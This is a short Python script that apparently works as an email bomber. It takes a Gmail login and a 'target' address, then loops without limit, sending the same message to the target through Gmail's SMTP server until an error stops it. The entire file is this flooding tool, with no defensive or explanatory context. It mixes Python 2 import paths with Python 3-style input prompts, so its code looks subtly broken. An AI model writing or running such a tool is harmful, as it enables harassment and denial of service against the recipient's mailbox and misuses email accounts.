import smtplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
fromaddr=input("Enter the sender's email address:")
password=input("Enter the sender's email password:")
toaddr=input("Enter the target email:")
subject=input("Enter the subject:")
body=input("Enter the message:")

l=0
while True:
    l=l+1
    try:
        msg = MIMEMultipart()
        msg['From'] = fromaddr
        msg['To'] = toaddr
        msg['Subject'] = subject
         
        msg.attach(MIMEText(body, 'plain'))
         
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(fromaddr, password)
        text = msg.as_string()
        server.sendmail(fromaddr, toaddr, text)
        server.quit()
        print ('Email %s'%(l))
    except:
        if l<2:
            print("Did you allow access from less secure apps on the sender's email?")
        break
input("Press enter to quit.")
            


           
        
            

